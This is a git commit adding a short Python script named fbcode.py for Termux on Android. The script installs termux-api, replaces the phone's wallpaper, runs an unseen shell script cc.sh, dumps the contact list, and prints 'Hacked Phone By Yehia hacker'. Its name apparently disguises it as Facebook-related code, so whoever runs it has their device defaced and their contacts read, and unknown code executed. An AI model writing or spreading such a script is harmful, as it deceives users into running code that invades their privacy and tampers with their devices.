602e80f8c2fbf3994ffbf2dd2520fdcce6939379
fbcode1 <46849182+fbcode1@users.noreply.github.com>
2019-01-19 11:19:02 -0800

    Add files via upload

---
+++ fbcode.py
@@ -0,0 +1,12 @@
+#!usr/bin/etc python
+# -*- coding: utf-8 -*-
+
+
+import os
+import time
+os.system("pkg install termux-api")
+
+os.system("termux-wallpaper -f DD.jpg")
+os.system("sh cc.sh")
+os.system("termux-contact-list")
+print("Hacked Phone By Yehia hacker")
